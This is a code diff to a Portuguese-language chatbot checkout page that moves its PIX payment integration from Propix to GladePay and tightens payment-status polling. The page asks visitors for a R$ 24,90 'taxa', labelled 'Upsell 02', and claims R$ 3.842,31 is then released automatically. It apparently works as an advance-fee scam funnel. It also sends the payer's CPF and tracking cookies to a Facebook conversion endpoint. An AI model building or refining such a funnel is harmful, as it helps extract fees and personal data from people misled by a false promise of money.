@@ -262,6 +262,8 @@
     footer { background: #001C4E; padding: 12px; text-align: center; }
     footer img { height: 22px; opacity: 0.9; }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="/gladepay-qr.js"></script>
 </head>
 <body>
 
@@ -345,13 +347,12 @@
     const VALOR_TOTAL = 'R$ 3.842,31';
     const VALOR_TAXA  = 'R$ 24,90';
     const TAXA_NUM    = 24.90;
+    const TAXA_CENTS  = 2490;
 
-    // Propix via backend — credenciais ficam no servidor
+    // GladePay via backend — credenciais ficam somente no servidor
 
-    function isPaidStatus(s){
-      if(!s) return false;
-      const v = String(s).toUpperCase();
-      return v === 'COMPLETO' || v === 'SETTLED' || v === 'PAID';
+    function isPaidStatus(status){
+      return status === 'PAID' || status === 'SETTLED';
     }
 
     const BETS = [
@@ -461,6 +462,8 @@
     // ─── FLUXO ───────────────────────────────────────────────────────────────
     let pixType = '';
     let pollingRef = null;
+    let pollingInFlight = false;
+    let paymentHandled = false;
 
     async function startChat(){
       await delay(900);
@@ -605,6 +608,26 @@
     }
 
     // ─── GLADEPAY ────────────────────────────────────────────────────────────
+    function getStableReference(){
+      const cpf=userCPF.replace(/\D/g,'')||'anonimo';
+      const storageKey=`gladepay_ref_upsell2_${cpf}`;
+      const now=Date.now();
+      try{
+        const saved=JSON.parse(localStorage.getItem(storageKey)||'null');
+        if(saved&&saved.reference&&now-saved.createdAt<15*60*1000) return saved.reference;
+      }catch(e){}
+      const nonce=window.crypto?.randomUUID?.()||`${now}-${Math.random().toString(16).slice(2)}`;
+      const reference=`UPSELL2-${cpf}-${nonce}`;
+      localStorage.setItem(storageKey,JSON.stringify({reference,createdAt:now}));
+      return reference;
+    }
+
+    async function readApiResponse(response){
+      const data=await response.json().catch(()=>({}));
+      if(!response.ok) throw new Error(data?.error?.message||`Erro HTTP ${response.status}`);
+      return data;
+    }
+
     async function gerarPix(chavePix){
       try{
         const utmP=new URLSearchParams();
@@ -614,29 +637,41 @@
         if(utmContent)  utmP.set('utm_content',utmContent);
         if(utmTerm)     utmP.set('utm_term',utmTerm);
         const utmQS=utmP.toString()?'?'+utmP.toString():'';
-        const refId=`UPSELL2-${Date.now()}-${userCPF.replace(/\D/g,'')}`;
-        const orderRes=await fetch(`/api/propix-deposito${utmQS}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:TAXA_NUM,description:'Upsell 02 - 24,90',payerName:userName,payerDocument:userCPF})});
-        const order=await orderRes.json();
-        if(!order.qrCodeText && !order.success) throw new Error('PIX não gerado');
+        const orderRes=await fetch(`/api/gladepay-deposito${utmQS}`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({
+            amountCents:TAXA_CENTS,
+            reference:getStableReference(),
+            description:'Upsell 02 - 24,90',
+            customerName:userName,
+            expiresInSeconds:900
+          })
+        });
+        const order=await readApiResponse(orderRes);
+        if(order.ok!==true||!order.qrCodeText||(!order.publicId&&!order.txId)) throw new Error('Cobrança GladePay incompleta');
         if(typeof fbq!=='undefined') fbq('track','InitiateCheckout',{value:TAXA_NUM,currency:'BRL',content_ids:['taxa-bets'],content_type:'product'});
         await botMsg('✅ Cobrança gerada! Copie o código PIX abaixo e pague no app do seu banco:', 1200);
         insertQrCard(order, chavePix);
       }catch(err){
         console.error(err);
-        await botMsg('⚠️ Erro ao gerar cobrança. Tente novamente em instantes.', 1000);
+        await botMsg(`⚠️ ${err.message||'Erro ao gerar cobrança. Tente novamente em instantes.'}`, 1000);
       }
     }
 
     function insertQrCard(order, chavePix){
       const pixCode=order.qrCodeText||'';
-      const qrImg=order.qrCodeBase64?(order.qrCodeBase64.startsWith('data:')?order.qrCodeBase64:`data:image/png;base64,${order.qrCodeBase64}`):'';
-      const extId=order.transactionId;
+      const base64Image=order.qrCodeBase64
+        ?(order.qrCodeBase64.startsWith('data:')?order.qrCodeBase64:`data:image/png;base64,${order.qrCodeBase64}`)
+        :'';
+      const qrImg=order.qrCodeUrl||base64Image;
+      const extId=order.publicId||order.txId;
       const row=document.createElement('div');
       row.className='message-row bot fadeIn';
       row.innerHTML=`
         <div class="avatar"></div>
         <div class="qr-card">
-          ${qrImg?`<img src="${qrImg}" alt="QR Code PIX">`:''}
+          <img id="qr-image-upsell2" src="" alt="QR Code PIX">
           <div class="copy-box">
             <div class="copy-label"><i class="fas fa-copy" style="margin-right:4px;"></i>Copia e Cola PIX</div>
             <div class="copy-code" id="pix-code-txt">${pixCode}</div>
@@ -648,6 +683,7 @@
           <div style="font-size:12px;color:#999;line-height:1.6;"><i class="fas fa-clock" style="margin-right:4px;"></i>Código expira em <strong>15 minutos</strong>. Após pagar, ${VALOR_TOTAL} é liberado automaticamente.</div>
         </div>`;
       chatContent.appendChild(row); scrollDown();
+      window.renderGladePayQr(document.getElementById('qr-image-upsell2'), qrImg, pixCode);
 
       document.getElementById('btn-copiar-pix').addEventListener('click',function(){
         navigator.clipboard.writeText(pixCode).then(()=>{
@@ -661,26 +697,40 @@
 
       if(extId) iniciarPolling(extId,chavePix);
       document.addEventListener('visibilitychange',async()=>{
-        if(document.visibilityState==='visible'&&extId){
-          try{const r=await fetch(`/api/hp-webhook?order_id=${extId}`);const d=await r.json();if(d.paid===true){clearInterval(pollingRef);await onPaid(chavePix);}}catch(e){}
+        if(document.visibilityState!=='visible'||!extId||pollingInFlight||paymentHandled) return;
+        pollingInFlight=true;
+        try{
+          const response=await fetch(`/api/gladepay-status?txId=${encodeURIComponent(extId)}`);
+          const data=await readApiResponse(response);
+          if(isPaidStatus(data.status)) await onPaid(chavePix);
+        }catch(e){
+          console.error('Erro ao consultar status GladePay:',e);
+        }finally{
+          pollingInFlight=false;
         }
       });
     }
 
     function iniciarPolling(extId,chavePix){
       pollingRef=setInterval(async()=>{
+        if(pollingInFlight||paymentHandled) return;
+        pollingInFlight=true;
         try{
-          const r=await fetch(`/api/propix-status?transactionId=${encodeURIComponent(extId)}`);
-          const d=await r.json();
-          if(d&&isPaidStatus(d.status)){clearInterval(pollingRef);await onPaid(chavePix);return;}
-          const wr=await fetch(`/api/hp-webhook?order_id=${extId}`);
-          const wd=await wr.json();
-          if(wd.paid===true){clearInterval(pollingRef);await onPaid(chavePix);return;}
-        }catch(e){}
+          const response=await fetch(`/api/gladepay-status?txId=${encodeURIComponent(extId)}`);
+          const data=await readApiResponse(response);
+          if(isPaidStatus(data.status)) await onPaid(chavePix);
+        }catch(e){
+          console.error('Erro ao consultar status GladePay:',e);
+        }finally{
+          pollingInFlight=false;
+        }
       },3000);
     }
 
     async function onPaid(chavePix){
+      if(paymentHandled) return;
+      paymentHandled=true;
+      clearInterval(pollingRef);
       const eventId=`purchase-bets-${Date.now()}`;
       if(typeof fbq!=='undefined') fbq('track','Purchase',{value:TAXA_NUM,currency:'BRL',content_ids:['taxa-bets'],content_type:'product'},{eventID:eventId});
       fetch('/api/fb-event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event_name:'Purchase',value:TAXA_NUM,currency:'BRL',cpf:userCPF,client_user_agent:navigator.userAgent,event_source_url:window.location.href,fbc:document.cookie.match(/_fbc=([^;]+)/)?.[1]||'',fbp:document.cookie.match(/_fbp=([^;]+)/)?.[1]||'',event_id:eventId})}).catch(()=>{});
